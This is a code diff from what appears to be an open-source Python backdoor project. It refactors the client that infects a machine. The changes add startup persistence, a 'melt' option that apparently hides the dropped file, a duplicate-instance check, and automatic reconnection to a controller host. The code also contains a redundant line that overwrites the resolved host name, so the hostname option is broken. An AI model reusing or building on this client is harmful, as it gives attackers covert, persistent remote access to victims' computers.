@@ -7,41 +7,48 @@ https://github.com/xp4xbox/Python-Backdoor
 import socket
 import sys
 
+from src import errors
 from src.client import persistence
-from src.client.command_handler import CommandHandler
 from src.client.socket import Socket
+import logger
 
 
 class Client:
-    def __init__(self, host, port, add_to_startup=False, melt=False):
+    def __init__(self, host, port, is_host_name=False, add_to_startup=False, melt=False):
+        logger.init()
+
+        self.socket = None
+
+        if is_host_name:
+            self.host = socket.gethostbyname(host)
+        else:
+            self.host = host
+
+        self.host = host
+        self.port = port
+
+        if persistence.is_duplicate_instance():
+            sys.exit(0)
+
         if melt:
             persistence.melt()
 
         if add_to_startup:
             try:
                 persistence.add_startup()
-            except Exception:
+            except errors.ClientSocket.Persistence.StartupError:
                 pass
 
-        self.socket = Socket(host, port)
-        self.socket.connect()
+    def start(self):
+        self.socket = Socket(self.host, self.port)
 
         try:
-            ch = CommandHandler(self.socket)
-
-            while True:
-                msg = self.socket.recv_json()
-                ch.parse(msg)
-
+            self.socket.connect()
         except socket.error:  # if the server closes without warning
             self.socket.close()
             del self.socket
-            self.__init__(host, port)
+            self.start()
 
 
 if __name__ == "__main__":
-    if persistence.is_duplicate_instance():
-        sys.exit(0)
-
-    # strHost = socket.gethostbyname("")
-    Client("127.0.0.1", 3000, False, False)
+    Client("127.0.0.1", 3000).start()
